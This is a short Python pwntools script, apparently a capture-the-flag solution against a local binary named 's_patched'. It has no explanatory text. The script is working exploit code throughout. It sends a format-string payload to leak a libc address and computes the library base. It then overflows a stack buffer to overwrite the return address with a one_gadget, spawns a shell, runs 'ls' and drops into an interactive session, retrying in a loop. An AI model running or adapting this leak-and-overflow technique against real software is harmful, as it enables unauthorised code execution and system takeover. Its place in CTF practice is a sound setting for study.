from pwn import *
import time

#context.log_level="critical"

chall="./s_patched"


while True:
    io=process(chall) 
    io.sendline(b"%12$p%42c\x7c\xa0")
    
    try:
        data = io.readline()
        leak = int(data.split(b' ')[0],16)
        og = 0xe3b01
        offset = 0x00007fd6f023f000 - 0x00007fd6f0263083
        print( hex(leak+offset))
        data=io.recvline(timeout=1)
        print(data)
        if b"fault" in data:
            io.close()
            continue
        #gdb.attach(io)
        io.sendline(b"a"*(30+8+8+2)+b"b"*8+p64(leak+offset+og))
        io.sendline(b"ls")
        io.interactive()
    except:
        pass
    io.close()
    time.sleep(1)